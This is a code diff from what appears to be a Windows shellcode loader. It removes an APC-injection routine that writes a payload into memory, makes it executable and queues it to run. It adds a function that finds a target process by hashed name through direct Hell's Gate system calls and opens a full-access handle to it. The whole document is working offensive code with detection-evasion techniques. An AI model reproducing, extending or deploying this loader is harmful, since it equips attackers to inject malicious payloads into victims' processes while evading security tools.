@@ -4,77 +4,64 @@
 #include "Resolver.h"
 #include "Loader.h"
 #include "Utils.h"
+#include "Crypto.h"
 
-Loader::Loader() {
-	resolver = Resolver();
-	if (!this->InitSyscallStruct(&St)) {
-		printf("[!] Could not init Syscall struct!\n");
-		ExitProcess(-1);
-	};
-}
+BOOL Loader::GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {
+	ULONG uReturnLen1 = NULL;
+	ULONG uReturnLen2 = NULL;
 
-BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
-	HMODULE hNtdll = resolver.GetModHandle(L"NTDLL.DLL");
-	if (!hNtdll) return FALSE;
+	PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
+	PVOID pValueToFree = NULL;
+	NTSTATUS STATUS = NULL;
 
-	st->pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)resolver.GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-	st->pNtProtectVirtualMemory		= (fnNtProtectVirtualMemory)resolver.GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-	st->pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)resolver.GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-	st->pNtQueueApcThread			= (fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "NtQueueApcThread");
+	// This will fail but its intentional:
+	HellsGate(resolver.g_Sys.NtQuerySystemInformation.wSystemCall);
+	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);
 
-	if (st->pNtAllocateVirtualMemory	== NULL ||
-		st->pNtProtectVirtualMemory		== NULL ||
-		st->pNtWriteVirtualMemory		== NULL ||
-		st->pNtQueueApcThread			== NULL) {
-		printf("[!] Syscall struct contains null functions !!!\n");
+	// Allocating enough buffer for the returned array of 'SYSTEM_PROCESS_INFORMATION' struct
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL) {
 		return FALSE;
 	}
-	else {
-		return TRUE;
-	}
-}
-
-BOOL Loader::ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
-	sSize = sPayloadSize;
 	
-	// Allocate memory
-	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
+	pValueToFree = SystemProcInfo;
+
+	// calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
+	HellsGate(resolver.g_Sys.NtQuerySystemInformation.wSystemCall);
+	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
+	if (STATUS != 0x0) {
+#ifdef DEBUG
+		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
+#endif // DEBUG
+
 		return FALSE;
 	}
 
-	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, (PULONG)&sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
-		return FALSE;
+	while (TRUE) {
+		// small check for the process's name size
+		// comparing the enumerated process name to what we want to target
+		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
+			// openning a handle to the target process and saving it, then breaking 
+			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
+			*phProcess = resolver.g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			break;
+		}
+
+		// if NextEntryOffset is 0, we reached the end of the array
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		// moving to the next element in the array
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 	}
 
-	// Change permissions to RWX
-	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
-		return FALSE;
-	}
+	// freeing using the initial address
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
 
-	// Execute Payload:
-	printf("[#] Press <Enter> To Run the payload ...");
-	getchar();
-	if ((STATUS = St.pNtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAddress, NULL, NULL, NULL)) != 0) {
-		printf("[!] NtQueueApcThread Failed !!!\n");
+	// checking if we got the target's process handle
+	if (*pdwPid == NULL || *phProcess == NULL)
 		return FALSE;
-	}
-	printf("[+] DONE \n");
-	return TRUE;
+	else
+		return TRUE;
 }
-
-int Loader::RunApcInjection(IN PVOID pPayload, IN SIZE_T sPayloadSize) {
-	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AlertableFunction, NULL, NULL, NULL);
-	if (!hThread) {
-		printf("[!] CreateThread Failed !!!\n");
-		return -1;
-	}
-
-	if (!this->ApcInjection((HANDLE)-1, hThread, pPayload, sPayloadSize)) {
-		return -1;
-	}
-
-	printf("[#] Press <Enter> To Quit ...\n");
-	getchar();
-	return 0;
-}
-
